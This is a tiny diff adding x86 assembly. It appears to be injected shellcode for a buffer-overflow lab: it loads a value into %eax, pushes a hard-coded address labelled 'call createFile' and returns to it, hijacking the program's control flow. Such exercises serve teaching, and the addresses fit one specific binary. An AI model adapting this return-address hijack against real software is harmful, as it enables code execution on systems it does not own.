@@ -1,0 +1,6 @@
+#movl $0x1eb2051b, %eax
+#movl $0x55683da0, %ebp
+movl $0x31313131, %eax
+push %ebp
+pushl $0x08048df4		#call createFile
+ret
